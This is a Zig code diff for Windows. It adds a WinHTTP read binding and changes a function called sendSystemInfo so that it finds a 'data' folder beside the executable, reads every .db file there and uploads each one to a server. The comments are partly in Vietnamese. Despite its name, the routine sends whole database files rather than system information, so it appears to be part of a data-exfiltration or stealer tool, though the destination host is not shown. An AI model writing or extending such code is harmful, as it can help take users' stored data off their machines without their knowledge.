@@ -69,6 +69,13 @@ const WINHTTP = struct {
         lpdwBufferLength: *DWORD,
         lpdwIndex: ?*DWORD,
     ) callconv(windows.WINAPI) BOOL;
+
+    extern "winhttp" fn WinHttpReadData(
+        hRequest: HINTERNET,
+        lpBuffer: LPVOID,
+        dwNumberOfBytesToRead: DWORD,
+        lpdwNumberOfBytesRead: *DWORD,
+    ) callconv(windows.WINAPI) BOOL;
 };
 
 // Fixed UTF-16 strings
@@ -113,28 +120,34 @@ pub fn sendSystemInfo() !void {
     const allocator = gpa.allocator();
     defer _ = gpa.deinit();
 
-    // Open data directory
-    var dir = try std.fs.cwd().openDir("data", .{ .iterate = true });
+    // Lấy đường dẫn thư mục thực thi
+    const exe_dir_path = try std.fs.selfExePathAlloc(allocator);
+    defer allocator.free(exe_dir_path);
+    const exe_dir = std.fs.path.dirname(exe_dir_path) orelse return error.NoPath;
+
+    // Tạo đường dẫn đến thư mục data
+    const data_dir_path = try std.fs.path.join(allocator, &[_][]const u8{ exe_dir, "data" });
+    defer allocator.free(data_dir_path);
+
+    // Mở thư mục data với đường dẫn tuyệt đối
+    var dir = try std.fs.openDirAbsolute(data_dir_path, .{ .iterate = true });
     defer dir.close();
 
-    // Iterate through each file in directory
+    // Phần còn lại của hàm giữ nguyên
     var dir_iterator = dir.iterate();
     while (try dir_iterator.next()) |entry| {
         if (entry.kind != .file) continue;
         if (!std.mem.endsWith(u8, entry.name, ".db")) continue;
 
-        std.debug.print("Processing file: {s}\n", .{entry.name});
+        std.debug.print("Đang xử lý file: {s}\n", .{entry.name});
 
-        // Open file
         const file = try dir.openFile(entry.name, .{ .mode = .read_only });
         defer file.close();
 
-        // Read file contents
         const file_size = try file.getEndPos();
         const file_content = try file.readToEndAlloc(allocator, file_size);
         defer allocator.free(file_content);
 
-        // Send file to server
         try sendFileContent(file_content, entry.name);
     }
 }
